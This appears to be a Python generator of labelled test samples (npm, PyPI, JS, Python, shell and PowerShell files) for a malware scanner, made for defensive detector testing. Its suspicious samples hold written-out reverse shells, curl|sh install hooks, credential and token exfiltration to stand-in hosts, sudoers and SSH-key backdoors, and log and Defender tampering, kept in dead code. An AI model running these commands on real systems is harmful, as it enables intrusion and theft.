#!/usr/bin/env python3
"""FileGuard test-case generator. Builds INERT samples: every suspicious code path is dead code
(early exit/return or never-called function), all network endpoints are reserved (.invalid,
203.0.113.0/24, 198.51.100.0/24, 192.0.2.0/24). Nothing here is functional malware."""
import base64, gzip, hashlib, io, json, os, random, secrets, shutil, stat, struct, subprocess, sys, tarfile, tempfile, time, zipfile
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))
import vba

SEED = int(os.environ.get("FG_SEED") or secrets.randbits(48))
R = random.Random(SEED)
STAMP = time.strftime("%Y%m%d-%H%M")
OUT = Path(os.environ.get("FG_OUT") or Path(__file__).resolve().parent.parent / STAMP)
OUT.mkdir(parents=True, exist_ok=True)
MANIFEST = []
INERT = "FileGuard inert test sample - non-functional, reserved addresses only"

WORDS = ["amber", "birch", "cobalt", "delta", "ember", "fjord", "glade", "harbor", "indigo", "juniper", "kepler", "lumen",
         "maple", "nimbus", "orbit", "pixel", "quartz", "raven", "sable", "tundra", "umber", "vertex", "willow", "xenon",
         "yonder", "zephyr", "lattice", "meadow", "comet", "pebble", "cinder", "summit"]
def w(): return R.choice(WORDS)
def uniq(prefix=""): return f"{prefix}{w()}-{w()}-{R.randint(10, 99)}"
def dom(): return R.choice([f"{w()}-{w()}.invalid", f"cdn.{w()}{R.randint(1, 99)}.invalid", f"api.{w()}-sync.invalid", f"{w()}.update.invalid"])
def ip(): return f"{R.choice(['203.0.113', '198.51.100', '192.0.2'])}.{R.randint(2, 254)}"
def port(): return R.choice([4444, 8000, 8443, 9001, 1337, 6667, 5555])
def ver(): return f"{R.randint(0, 4)}.{R.randint(0, 19)}.{R.randint(0, 30)}"
def b64(s): return base64.b64encode(s.encode()).decode()
def pad_payload(s, n=260):
    while len(s) < n:
        s += f"\n// {INERT} {R.randint(1000, 9999)}"
    return s

def sev_verdict(planted, scenario=""):
    sevs = [p["sev"] for p in planted]
    meds = {p.get("code") or p["id"] for p in planted if p["sev"] == "medium"}
    if "critical" in sevs: return "BLOCK"
    if "high" in sevs: return "HIGH_RISK" + ("（安装钩子脚本命中高危特征时可升级为 BLOCK）" if scenario in ("npm_tarball", "pypi_sdist", "debian_deb", "rpm") else "")
    if len(meds) >= 2: return "HIGH_RISK（多项中危相互印证）"
    if meds: return "NO_FINDINGS(风险 MEDIUM) 或 INCOMPLETE —— 单一中危不足以升级"
    return "NO_FINDINGS 或 INCOMPLETE —— 只有低危信号"

def record(path, scenario, label, planted, note=""):
    p = Path(path)
    sha = hashlib.sha256(p.read_bytes()).hexdigest()
    MANIFEST.append({"path": str(p.relative_to(OUT)), "scenario": scenario, "label": label, "sha256": sha, "size": p.stat().st_size,
                     "planted_count": len(planted),
                     "planted": [{"id": x["id"], "severity_expected": x["sev"], "desc": x["desc"]} for x in planted],
                     "expected_verdict": ("NO_FINDINGS（环境缺项时可能 INCOMPLETE）" if label == "clean" else sev_verdict(planted, scenario)),
                     "note": note})

def pick(pool):
    k = R.randint(1, min(6, len(pool)))
    return R.sample(pool, k)

def targz(path, files, mode_map=None):
    with tarfile.open(path, "w:gz") as tf:
        for name, data in files.items():
            b = data.encode() if isinstance(data, str) else data
            ti = tarfile.TarInfo(name); ti.size = len(b); ti.mtime = int(time.time()) - R.randint(0, 9_000_000)
            ti.mode = (mode_map or {}).get(name, 0o644)
            tf.addfile(ti, io.BytesIO(b))

def mkzip(path, files):
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in files.items():
            z.writestr(name, data)

def scen_dir(name):
    d = OUT / name; d.mkdir(exist_ok=True); return d

# ===================================================================== shared JS snippets (dead code)
def js_dead(blocks):
    return "\n// --- " + INERT + " ---\nfunction __fgInertSample() {\n  return; // never runs\n" + "\n".join("  " + l for b in blocks for l in b.split("\n")) + "\n}\nmodule.exports.__fgInertSample = __fgInertSample;\n"

def jsb_obf_eval():
    payload = pad_payload(f"require('child_process').execSync('curl -fsSL https://{dom()}/s2.sh | sh'); // {INERT}")
    form = R.choice(["eval(Buffer.from('{p}', 'base64').toString())", "eval(atob('{p}'))", "new Function(atob('{p}'))()"])
    return dict(id="obfuscated_eval", sev="high", desc="Base64 编码后 eval 执行（解码内容为 curl|sh 下载执行）", js=form.format(p=b64(payload)))
def jsb_child_curl():
    d = dom()
    return dict(id="child_process_curl_pipe_sh", sev="high", desc=f"child_process.execSync 调 curl {d} | sh",
                js=f"const {{ execSync }} = require('child_process');\nconst https = require('https');\nexecSync('curl -fsSL https://{d}/bootstrap.sh | sh');")
def jsb_cred_exfil():
    i = ip()
    return dict(id="credential_exfil", sev="high", desc=f"读取 ~/.npmrc、~/.ssh/id_rsa 并 https.request 外发到 {i}",
                js=f"const fs = require('fs'), os = require('os'), https = require('https');\nconst loot = ['.npmrc', '.ssh/id_rsa', '.aws/credentials'].map(f => {{ try {{ return fs.readFileSync(os.homedir() + '/' + f, 'utf8'); }} catch (e) {{ return ''; }} }});\nconst req = https.request({{ host: '{i}', port: {port()}, path: '/c', method: 'POST' }});\nreq.end(JSON.stringify(loot));")
def jsb_env_tokens():
    d = dom()
    return dict(id="env_token_exfil", sev="high", desc=f"收集 NPM_TOKEN/GITHUB_TOKEN/AWS_SECRET_ACCESS_KEY 并 fetch 到 {d}",
                js=f"const t = {{ npm: process.env.NPM_TOKEN, gh: process.env.GITHUB_TOKEN, aws: process.env.AWS_SECRET_ACCESS_KEY }};\nfetch('https://{d}/collect', {{ method: 'POST', body: JSON.stringify(t) }});")
def jsb_xor_decoder():
    key = R.randint(17, 250)
    enc = "".join(chr(ord(c) ^ key) for c in f"inert://{dom()}")
    s = base64.b64encode(enc.encode("latin-1")).decode()[::-1].replace("=", "_")
    return dict(id="reverse_base64_xor_decoder", sev="high", desc="反转字符串 + Base64 + XOR 解码器（Axios 投毒同款混淆）",
                js=f"function _d(s) {{\n  const b = Buffer.from(s.split('').reverse().join('').replace('_', '='), 'base64').toString('latin1');\n  let o = ''; for (let i = 0; i < b.length; i++) o += String.fromCharCode(b.charCodeAt(i) ^ {key} );\n  return o;\n}}\nconst _u = _d('{s}');")
def jsb_platform_dropper():
    d = dom()
    return dict(id="platform_dropper", sev="high", desc="按 os.platform() 分支，分别调 curl / powershell / nohup 落地",
                js=f"const os = require('os'); const {{ exec }} = require('child_process');\nconst p = os.platform();\nif (p === 'darwin') exec('curl -so /Library/Caches/com.apple.{w()}d https://{d}/m && nohup /Library/Caches/com.apple.{w()}d &');\nelse if (p === 'win32') exec('powershell -w hidden -c iwr https://{d}/w -OutFile %TEMP%\\\\{w()}.ps1');\nelse if (p === 'linux') exec('curl -so /tmp/ld.py https://{d}/l && nohup python3 /tmp/ld.py &');")
def jsb_selfdelete():
    return dict(id="self_delete_swap", sev="high", desc="unlinkSync(__filename) 并用 package.md 覆盖 package.json",
                js="const fs = require('fs'), dir = __dirname;\nfs.unlinkSync(__filename);\nfs.renameSync(dir + '/package.md', dir + '/package.json');")
def jsb_charcode_eval():
    s = f"console.log('{INERT}')"
    return dict(id="fromcharcode_eval", sev="medium", code="obf", desc="eval(String.fromCharCode(...)) 动态执行",
                js=f"eval(String.fromCharCode({', '.join(str(ord(c)) for c in s)}));")

# ===================================================================== 1. npm tarball
def npm_clean(d):
    name = uniq("@fg-demo/")
    deps = R.choice([{}, {"ms": "^2.1.3"}, {"picocolors": "^1.0.0"}])
    pj = {"name": name, "version": ver(), "description": f"Tiny {w()} string helpers", "main": "index.js", "license": "MIT",
          "scripts": {"test": "node test.js"}, "dependencies": deps, "keywords": [w(), w()]}
    fn = R.choice(["slugify", "titleCase", "truncate"])
    idx = {"slugify": "module.exports = s => String(s).toLowerCase().trim().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');",
           "titleCase": "module.exports = s => String(s).replace(/\\w\\S*/g, t => t[0].toUpperCase() + t.slice(1).toLowerCase());",
           "truncate": "module.exports = (s, n = 20) => (s.length > n ? s.slice(0, n - 1) + '…' : s);"}[fn]
    files = {"package/package.json": json.dumps(pj, indent=2), "package/index.js": f"'use strict';\n// {fn}\n{idx}\n",
             "package/test.js": "const f = require('./');\nconsole.log(f('Hello World Example'));\n",
             "package/README.md": f"# {name}\n\n`{fn}` helper.\n", "package/LICENSE": "MIT License\n"}
    p = d / f"{name.split('/')[-1]}-{pj['version']}.tgz"; targz(p, files); record(p, "npm_tarball", "clean", [])

def npm_susp(d):
    typo = R.choice(["lodahs", "expresss", "axois", "chalkk", "momment", "dotevn", "uuidd"])
    pool = ["hook_curl_pipe", "hook_node_dropper", "obf_eval", "cred_exfil", "env_tokens", "decoy_manifest", "typosquat", "npmrc_token", "bin_hijack", "xor_decoder", "gyp_cmd"]
    chosen = pick(pool)
    name = typo if "typosquat" in chosen else uniq("@fg-demo/")
    pj = {"name": name, "version": ver(), "description": f"{w()} utilities", "main": "index.js", "license": "ISC", "scripts": {}}
    files, planted, lib = {}, [], []
    for c in chosen:
        if c == "hook_curl_pipe":
            d0 = dom(); hook = R.choice(["preinstall", "install"])
            pj["scripts"][hook] = f"curl -fsSL https://{d0}/i.sh | sh || true"
            planted.append(dict(id=c, sev="critical", desc=f"{hook} 钩子直接 curl {d0} | sh"))
        elif c == "hook_node_dropper":
            pj["scripts"]["postinstall"] = "node scripts/setup.js"
            b = jsb_platform_dropper(); files["package/scripts/setup.js"] = "'use strict';\n" + js_dead([b["js"]])
            planted.append(dict(id=c, sev="critical", desc="postinstall 运行 scripts/setup.js，内含按平台分支的下载落地器（钩子脚本命中高危 → 升级严重）"))
        elif c == "decoy_manifest":
            pj["scripts"]["prepare"] = "node scripts/clean.js"
            b = jsb_selfdelete(); files["package/scripts/clean.js"] = js_dead([b["js"]])
            planted.append(dict(id=c, sev="high", desc="附带与 package.json 不一致的 package.md，prepare 钩子脚本删除自身并替换清单（反取证）"))
        elif c == "typosquat":
            planted.append(dict(id=c, sev="high", desc=f"包名 {name} 仿冒热门包"))
        elif c == "npmrc_token":
            files["package/.npmrc"] = f"registry=https://{dom()}/npm/\n//{dom()}/:_authToken=npm_FAKE{secrets.token_hex(12)}\n"
            planted.append(dict(id=c, sev="high", desc="包内 .npmrc 带假 authToken 并改 registry 到 .invalid"))
        elif c == "bin_hijack":
            cmd = R.choice(["npm", "node", "git", "sudo"]); pj["bin"] = {cmd: "./bin/cli.js"}
            files["package/bin/cli.js"] = "#!/usr/bin/env node\nconsole.log('cli');\n"
            planted.append(dict(id=c, sev="high", desc=f"bin 字段注册全局命令 `{cmd}`，覆盖常用命令"))
        elif c == "gyp_cmd":
            files["package/binding.gyp"] = json.dumps({"targets": [{"target_name": "addon", "sources": ["<!(curl -s https://%s/src.c)" % dom()]}]})
            planted.append(dict(id=c, sev="medium", code="gyp", desc="binding.gyp 用 <!(curl ...) 命令展开，编译时执行"))
        else:
            b = {"obf_eval": jsb_obf_eval, "cred_exfil": jsb_cred_exfil, "env_tokens": jsb_env_tokens, "xor_decoder": jsb_xor_decoder}[c]()
            lib.append(b["js"]); planted.append(dict(id=c, sev=b["sev"], desc=b["desc"], code=b.get("code")))
    if "decoy_manifest" in chosen:
        decoy = json.loads(json.dumps(pj)); decoy["scripts"] = {"test": "echo ok"}; decoy.pop("bin", None)
        files["package/package.md"] = json.dumps(decoy, indent=2)
    files["package/package.json"] = json.dumps(pj, indent=2)
    files["package/index.js"] = "'use strict';\nmodule.exports = { pad: (s, n) => String(s).padStart(n) };\n"
    if lib: files[f"package/lib/{w()}.js"] = "'use strict';\n" + js_dead(lib)
    files["package/README.md"] = f"# {name}\n"
    p = d / f"{name.split('/')[-1]}-{pj['version']}.tgz"; targz(p, files); record(p, "npm_tarball", "suspicious", planted)

# ===================================================================== 2/3. PyPI sdist & wheel
def py_dead(blocks):
    return f"\n\ndef _fg_inert_sample():\n    \"\"\"{INERT}\"\"\"\n    return  # never runs\n" + "\n".join("    " + l for b in blocks for l in b.split("\n")) + "\n"

def pyb(c):
    i, d0 = ip(), dom()
    if c == "setup_net_exec":
        return dict(sev="high", desc=f"urllib.request.urlopen({i}) 下载后 os.system 执行",
                    py=f"import urllib.request, os\ndata = urllib.request.urlopen('http://{i}:{port()}/p.sh').read()\nos.system('sh -c \"' + data.decode() + '\"')")
    if c == "exec_b64":
        payload = pad_payload(f"import os; os.system('curl -fsSL http://{i}/x.sh | sh')  # {INERT}").replace("//", "#")
        return dict(sev="high", desc="exec(base64.b64decode(...)) 执行隐藏代码（解码后为 curl|sh）", py=f"import base64\nexec(base64.b64decode('{b64(payload)}'))")
    if c == "reverse_shell":
        return dict(sev="critical", desc=f"Python 反弹 shell 特征串（socket→{i}，os.dup2）",
                    py=f"import socket, os, pty\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{i}',{port()}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn('/bin/sh')")
    if c == "env_tokens":
        return dict(sev="high", desc=f"读取 AWS_SECRET_ACCESS_KEY/GITHUB_TOKEN/PYPI_TOKEN 并 requests.post 到 {d0}",
                    py=f"import os, requests\nt = {{k: os.environ.get(k) for k in ('AWS_SECRET_ACCESS_KEY', 'GITHUB_TOKEN', 'PYPI_TOKEN')}}\nrequests.post('https://{d0}/t', json=t)")
    if c == "cred_paths":
        return dict(sev="low", desc="引用 ~/.aws/credentials、~/.pypirc、~/.ssh/id_rsa 路径",
                    py="import os\nfor f in ('.aws/credentials', '.pypirc', '.ssh/id_rsa'):\n    p = os.path.join(os.path.expanduser('~'), f)\n    open(p).read() if os.path.exists(p) else None")
    if c == "miner":
        return dict(sev="high", desc="内嵌矿池地址 stratum+tcp:// 与 xmrig 参数", py=f"POOL = 'stratum+tcp://pool.{w()}.invalid:3333'\nARGS = ['xmrig', '-o', POOL, '--algo', 'cryptonight']")
    if c == "crontab":
        return dict(sev="low", desc="crontab 写定时任务持久化", py=f"import os\nos.system('(crontab -l; echo \"*/30 * * * * curl -s http://{i}/hb\") | crontab -')")
    if c == "authorized_keys":
        return dict(sev="high", desc="向 ~/.ssh/authorized_keys 追加公钥（登录后门）",
                    py="import os\nos.system('echo ssh-ed25519 AAAAFAKEKEYFORTESTING inert@example.invalid >> ~/.ssh/authorized_keys')")
    if c == "history_wipe":
        return dict(sev="medium", code="anti", desc="清空 shell 历史（history -c / unset HISTFILE）", py="import os\nos.system('history -c; unset HISTFILE')")
    if c == "self_delete":
        return dict(sev="medium", code="anti", desc="os.remove(__file__) 删除自身", py="import os\nos.remove(__file__)")
    raise KeyError(c)

def sdist_clean(d):
    name = f"fg-{w()}-{w()}"; v = ver(); mod = name.replace("-", "_")
    setup = f"from setuptools import setup, find_packages\n\nsetup(\n    name='{name}',\n    version='{v}',\n    description='Small {w()} helpers',\n    packages=find_packages(),\n    python_requires='>=3.8',\n    install_requires={R.choice(['[]', repr(['six>=1.16'])])},\n)\n"
    files = {f"{name}-{v}/setup.py": setup,
             f"{name}-{v}/pyproject.toml": "[build-system]\nrequires = [\"setuptools>=61\"]\nbuild-backend = \"setuptools.build_meta\"\n",
             f"{name}-{v}/PKG-INFO": f"Metadata-Version: 2.1\nName: {name}\nVersion: {v}\nSummary: helpers\n\nhelpers\n",
             f"{name}-{v}/{mod}/__init__.py": "def chunks(seq, n):\n    for i in range(0, len(seq), n):\n        yield seq[i:i + n]\n",
             f"{name}-{v}/README.md": f"# {name}\n"}
    p = d / f"{name}-{v}.tar.gz"; targz(p, files); record(p, "pypi_sdist", "clean", [])

def sdist_susp(d):
    pool = ["setup_net_exec", "exec_b64", "cmdclass", "pth_file", "sitecustomize", "intree_backend", "typosquat", "env_tokens", "reverse_shell", "miner"]
    chosen = pick(pool)
    name = R.choice(["reqeusts", "numpyy", "pandsa", "flaskk", "djnago", "colorsama", "urlib3"]) if "typosquat" in chosen else f"fg-{w()}-{w()}"
    v = ver(); mod = name.replace("-", "_"); root = f"{name}-{v}"
    files, planted, setup_blocks, mod_blocks = {}, [], [], []
    cmdclass = ""
    pyproject = "[build-system]\nrequires = [\"setuptools>=61\"]\nbuild-backend = \"setuptools.build_meta\"\n"
    for c in chosen:
        if c == "cmdclass":
            cmdclass = ("from setuptools.command.install import install\nimport subprocess\n\nclass PostInstall(install):\n    def run(self):\n        install.run(self)\n"
                        f"        return  # inert\n        subprocess.call(['sh', '-c', 'curl -s http://{ip()}/p | sh'])\n\n")
            planted.append(dict(id=c, sev="high", desc="cmdclass 重写 install，安装后 subprocess 调 curl http://<IP>|sh（setup.py 同时含 IP 网址与 subprocess → YARA 高危）"))
        elif c == "pth_file":
            files[f"{root}/{mod}_init.pth"] = f"import os, base64; exec(base64.b64decode('{b64('print(1)  # ' + INERT)}'))\n"
            planted.append(dict(id=c, sev="high", desc=".pth 文件以 import 开头并 exec 解码内容（每次启动 Python 自动执行）"))
        elif c == "sitecustomize":
            files[f"{root}/sitecustomize.py"] = f"# {INERT}\nimport os\n_ = os.environ.get('HOME')\n"
            planted.append(dict(id=c, sev="medium", code="sitecustomize", desc="包内附带 sitecustomize.py（每次启动 Python 自动执行）"))
        elif c == "intree_backend":
            be = f"{w()}_build"
            pyproject = f"[build-system]\nrequires = []\nbuild-backend = \"{be}.backend\"\nbackend-path = [\"_build\"]\n"
            files[f"{root}/_build/{be}/backend.py"] = f"# {INERT}\ndef build_wheel(*a, **k):\n    raise SystemExit('inert')\n"
            planted.append(dict(id=c, sev="medium", code="backend", desc="pyproject.toml 用不常见的包内自带构建后端（会产生 PY_UNCOMMON_BACKEND + PY_INTREE_BACKEND 两项中危）"))
        elif c == "typosquat":
            planted.append(dict(id=c, sev="high", desc=f"包名 {name} 仿冒热门 PyPI 包"))
        elif c == "setup_net_exec":
            b = pyb(c); setup_blocks.append(b["py"]); planted.append(dict(id=c, sev=b["sev"], desc="setup.py 中 " + b["desc"]))
        else:
            b = pyb(c); where = "setup.py" if R.random() < 0.5 else f"{mod}/__init__.py"
            (setup_blocks if where == "setup.py" else mod_blocks).append(b["py"])
            planted.append(dict(id=c, sev=b["sev"], desc=f"{where}: " + b["desc"], code=b.get("code")))
    setup = cmdclass + "from setuptools import setup, find_packages\n" + (py_dead(setup_blocks) if setup_blocks else "") + \
        f"\nsetup(\n    name='{name}',\n    version='{v}',\n    packages=find_packages(),\n" + ("    cmdclass={'install': PostInstall},\n" if cmdclass else "") + ")\n"
    files.update({f"{root}/setup.py": setup, f"{root}/pyproject.toml": pyproject,
                  f"{root}/PKG-INFO": f"Metadata-Version: 2.1\nName: {name}\nVersion: {v}\nSummary: tools\n\ntools\n",
                  f"{root}/{mod}/__init__.py": "def hello():\n    return 'hi'\n" + (py_dead(mod_blocks) if mod_blocks else "")})
    p = d / f"{name}-{v}.tar.gz"; targz(p, files); record(p, "pypi_sdist", "suspicious", planted)

def wheel(path, name, v, files, entry=None):
    dist = f"{name.replace('-', '_')}-{v}.dist-info"
    files = dict(files)
    files[f"{dist}/METADATA"] = f"Metadata-Version: 2.1\nName: {name}\nVersion: {v}\nSummary: {w()} toolkit\n\n"
    files[f"{dist}/WHEEL"] = "Wheel-Version: 1.0\nGenerator: bdist_wheel (0.43.0)\nRoot-Is-Purelib: true\nTag: py3-none-any\n"
    if entry: files[f"{dist}/entry_points.txt"] = entry
    rec = []
    for n, data in files.items():
        b = data.encode() if isinstance(data, str) else data
        rec.append(f"{n},sha256={base64.urlsafe_b64encode(hashlib.sha256(b).digest()).rstrip(b'=').decode()},{len(b)}")
    rec.append(f"{dist}/RECORD,,")
    files[f"{dist}/RECORD"] = "\n".join(rec) + "\n"
    mkzip(path, files)

def whl_clean(d):
    name = f"fg-{w()}-{w()}"; v = ver(); mod = name.replace("-", "_"); cli = f"{w()}-tool"
    files = {f"{mod}/__init__.py": "__version__ = '%s'\n" % v, f"{mod}/cli.py": "import sys\n\ndef main():\n    print(' '.join(reversed(sys.argv[1:])))\n"}
    p = d / f"{mod}-{v}-py3-none-any.whl"; wheel(p, name, v, files, f"[console_scripts]\n{cli} = {mod}.cli:main\n"); record(p, "pypi_wheel", "clean", [])

def whl_susp(d):
    pool = ["pth_autorun", "entrypoint_hijack", "sitecustomize", "exec_b64", "env_tokens", "miner", "cred_paths", "crontab", "reverse_shell"]
    chosen = pick(pool)
    name = f"fg-{w()}-{w()}"; v = ver(); mod = name.replace("-", "_")
    files, planted, blocks = {f"{mod}/__init__.py": "__all__ = []\n", f"{mod}/cli.py": "def main():\n    print('ok')\n"}, [], []
    entry = f"[console_scripts]\n{w()}-cli = {mod}.cli:main\n"
    for c in chosen:
        if c == "pth_autorun":
            files[f"{w()}_hook.pth"] = f"import sys, subprocess; subprocess.Popen(['curl', '-s', 'http://{ip()}/b']) if False else None\n"
            planted.append(dict(id=c, sev="high", desc="wheel 根目录 .pth：import 行引用 subprocess（每次启动 Python 都处理）"))
        elif c == "entrypoint_hijack":
            cmd = R.choice(["pip", "python", "git", "ls"]); entry += f"{cmd} = {mod}.cli:main\n"
            planted.append(dict(id=c, sev="high", desc=f"console_scripts 注册 `{cmd}` 覆盖常用命令"))
        elif c == "sitecustomize":
            files["sitecustomize.py"] = f"# {INERT}\nimport os\n"
            planted.append(dict(id=c, sev="medium", code="site", desc="wheel 附带 sitecustomize.py"))
        else:
            b = pyb(c); blocks.append(b["py"]); planted.append(dict(id=c, sev=b["sev"], desc=b["desc"], code=b.get("code")))
    if blocks: files[f"{mod}/_{w()}.py"] = py_dead(blocks)
    p = d / f"{mod}-{v}-py3-none-any.whl"; wheel(p, name, v, files, entry); record(p, "pypi_wheel", "suspicious", planted)

# ===================================================================== 4. JS script
def js_clean(d):
    kind = R.choice(["csv", "dates", "server"])
    src = {"csv": "#!/usr/bin/env node\n'use strict';\nconst fs = require('fs');\nconst rows = fs.readFileSync(process.argv[2], 'utf8').trim().split('\\n').map(l => l.split(','));\nconsole.log(`rows=${rows.length} cols=${rows[0].length}`);\n",
           "dates": "'use strict';\nfunction daysBetween(a, b) { return Math.round((new Date(b) - new Date(a)) / 86400000); }\nconsole.log(daysBetween('2026-01-01', process.argv[2] || '2026-12-31'));\n",
           "server": "'use strict';\nconst http = require('http');\nhttp.createServer((req, res) => { res.end('ok'); }).listen(process.env.PORT || 3000, '127.0.0.1');\n"}[kind]
    p = d / f"{R.choice(['report', 'util', 'tool', 'stats'])}_{kind}.js"; p.write_text(src); record(p, "javascript", "clean", [])

def js_susp(d):
    pool = [jsb_obf_eval, jsb_child_curl, jsb_cred_exfil, jsb_env_tokens, jsb_xor_decoder, jsb_platform_dropper, jsb_charcode_eval]
    blocks = [f() for f in pick(pool)]
    p = d / f"{R.choice(['update', 'helper', 'loader', 'sync'])}-{w()}.js"
    p.write_text("'use strict';\nconsole.log('starting');\n" + js_dead([b["js"] for b in blocks]))
    record(p, "javascript", "suspicious", [dict(id=b["id"], sev=b["sev"], desc=b["desc"], code=b.get("code")) for b in blocks])

# ===================================================================== 5. Python script
def py_clean(d):
    kind = R.choice(["rename", "wordcount", "json"])
    src = {"rename": "import os, sys\nfor n in os.listdir(sys.argv[1]):\n    if n.endswith('.JPG'):\n        os.rename(os.path.join(sys.argv[1], n), os.path.join(sys.argv[1], n[:-4] + '.jpg'))\n",
           "wordcount": "import collections, sys\nc = collections.Counter(open(sys.argv[1]).read().split())\nfor k, v in c.most_common(10):\n    print(v, k)\n",
           "json": "import json, sys\nprint(json.dumps(json.load(open(sys.argv[1])), indent=2, ensure_ascii=False))\n"}[kind]
    p = d / f"{kind}_{w()}.py"; p.write_text("#!/usr/bin/env python3\n" + src); record(p, "python_script", "clean", [])

def py_susp(d):
    blocks = [dict(id=c, **pyb(c)) for c in pick(["exec_b64", "reverse_shell", "env_tokens", "cred_paths", "crontab", "authorized_keys", "history_wipe", "self_delete", "miner"])]
    p = d / f"{R.choice(['sync', 'agent', 'monitor', 'patch'])}_{w()}.py"
    p.write_text("#!/usr/bin/env python3\nimport sys\nprint('ok')\nsys.exit(0)\n" + py_dead([b["py"] for b in blocks]))
    record(p, "python_script", "suspicious", [dict(id=b["id"], sev=b["sev"], desc=b["desc"], code=b.get("code")) for b in blocks])

# ===================================================================== 6. Shell
def shb(c):
    i, d0, pt = ip(), dom(), port()
    return {
        "curl_pipe": ("high", f"curl {d0} | bash 下载即执行", f"curl -fsSL https://{d0}/install.sh | bash"),
        "wget_tmp_exec": ("high", "wget 落地 /tmp 后 chmod +x 执行", f"wget -q http://{i}/.x -O /tmp/.{w()} && chmod +x /tmp/.{w()}"),
        "b64_pipe": ("high", "base64 -d | sh 执行编码命令", f"echo {b64('echo ' + INERT)} | base64 -d | sh"),
        "reverse_shell": ("critical", f"bash -i >& /dev/tcp/{i} 反弹 shell 特征", f"bash -i >& /dev/tcp/{i}/{pt} 0>&1"),
        "nc_shell": ("critical", "nc -e /bin/sh 反弹 shell 特征", f"nc {i} {pt} -e /bin/sh"),
        "authorized_keys": ("high", "追加 SSH 公钥到 authorized_keys", "echo 'ssh-ed25519 AAAAFAKEKEYFORTESTING inert@example.invalid' >> ~/.ssh/authorized_keys"),
        "crontab": ("low", "crontab 持久化", f"(crontab -l 2>/dev/null; echo '@reboot curl -s http://{i}/hb') | crontab -"),
        "sudoers": ("high", "写 /etc/sudoers 提权", "echo 'nobody ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"),
        "disable_sec": ("medium", "关闭 SELinux / ufw / iptables", R.choice(["setenforce 0", "ufw disable", "iptables -F"])),
        "history_wipe": ("medium", "清空 shell 历史", "history -c; unset HISTFILE"),
        "log_wipe": ("medium", "删除系统日志", "rm -rf /var/log/auth.log*"),
        "ld_preload": ("high", "写 /etc/ld.so.preload 全局库劫持", f"echo /usr/lib/lib{w()}.so > /etc/ld.so.preload"),
        "bashrc": ("low", "往 ~/.bashrc 追加启动命令", f"echo 'curl -s http://{i}/p >/dev/null' >> ~/.bashrc"),
    }[c]
SH_CODES = {"disable_sec": "evasion", "history_wipe": "anti", "log_wipe": "anti"}

def sh_clean(d):
    kind = R.choice(["backup", "rotate", "build"])
    src = {"backup": "set -euo pipefail\nSRC=${1:-$HOME/Documents}\nDEST=${2:-/mnt/backup}\ntar -czf \"$DEST/docs-$(date +%F).tar.gz\" -C \"$SRC\" .\necho done\n",
           "rotate": "set -eu\nfind ./logs -name '*.log' -mtime +14 -exec gzip {} \\;\nfind ./logs -name '*.gz' -mtime +60 -delete\n",
           "build": "set -e\nmkdir -p dist\ncp -r src/* dist/\necho \"built $(git rev-parse --short HEAD 2>/dev/null || echo local)\"\n"}[kind]
    p = d / f"{kind}.sh"; p.write_text("#!/usr/bin/env bash\n" + src); record(p, "shell_script", "clean", [])

def sh_susp(d):
    body, planted = [], []
    for c in pick(list(SHB_POOL)):
        sev, desc, line = shb(c); body.append(line); planted.append(dict(id=c, sev=sev, desc=desc, code=SH_CODES.get(c)))
    p = d / f"{R.choice(['setup', 'init', 'fix', 'deploy'])}-{w()}.sh"
    p.write_text(f"#!/bin/sh\n# {INERT}\nexit 0\n" + "\n".join(body) + "\n"); record(p, "shell_script", "suspicious", planted)
SHB_POOL = ["curl_pipe", "wget_tmp_exec", "b64_pipe", "reverse_shell", "nc_shell", "authorized_keys", "crontab", "sudoers", "disable_sec", "history_wipe", "log_wipe", "ld_preload", "bashrc"]

# ===================================================================== 7. PowerShell
def ps_clean(d):
    kind = R.choice(["disk", "services", "cleanup"])
    src = {"disk": "Get-PSDrive -PSProvider FileSystem | Select-Object Name, @{n='FreeGB';e={[math]::Round($_.Free/1GB,1)}} | Format-Table\n",
           "services": "Get-Service | Where-Object Status -eq 'Running' | Sort-Object DisplayName | Select-Object -First 20\n",
           "cleanup": "param([int]$Days = 30)\nGet-ChildItem $env:TEMP -File | Where-Object LastWriteTime -lt (Get-Date).AddDays(-$Days) | Remove-Item -WhatIf\n"}[kind]
    p = d / f"Get-{kind.title()}Report.ps1"; p.write_text(src); record(p, "powershell", "clean", [])

def ps_susp(d):
    body, planted = [], []
    for c in pick(["iex_download", "encoded_cmd", "frombase64_iex", "defender_off", "run_key", "copy_masquerade", "iwr_start", "clear_log"]):
        i, d0 = ip(), dom()
        sev, desc, line, code = {
            "iex_download": ("high", f"IEX (New-Object Net.WebClient).DownloadString({d0})", f"IEX (New-Object Net.WebClient).DownloadString('https://{d0}/a.ps1')", None),
            "encoded_cmd": ("high", "powershell -w hidden -ep bypass -enc <base64>", "powershell.exe -NoP -w hidden -ep bypass -enc " + base64.b64encode(f"Write-Output '{INERT}'".encode("utf-16le")).decode(), None),
            "frombase64_iex": ("high", "FromBase64String 解码后 Invoke-Expression", f"$c = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64('Write-Host inert')}')); Invoke-Expression $c", None),
            "defender_off": ("medium", "Set-MpPreference 关闭 Defender 实时防护", "Set-MpPreference -DisableRealtimeMonitoring $true", "evasion"),
            "run_key": ("low", "写 HKCU Run 键自启动", f"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{w()}' -Value 'wscript.exe C:\\Users\\Public\\{w()}.vbs'", None),
            "copy_masquerade": ("high", "把 powershell.exe 复制成 wt.exe（Axios 同款伪装）", "Copy-Item C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe $env:PROGRAMDATA\\wt.exe", None),
            "iwr_start": ("high", f"Invoke-WebRequest 下载 {i} 后 Start-Process 运行", f"Invoke-WebRequest -Uri http://{i}/u.exe -OutFile $env:TEMP\\u.exe; Start-Process $env:TEMP\\u.exe", None),
            "clear_log": ("medium", "Clear-EventLog 清日志", "Clear-EventLog -LogName Security, System", "anti"),
        }[c]
        body.append(line); planted.append(dict(id=c, sev=sev, desc=desc, code=code))
    p = d / f"{R.choice(['Update', 'Install', 'Repair'])}-{w().title()}.ps1"
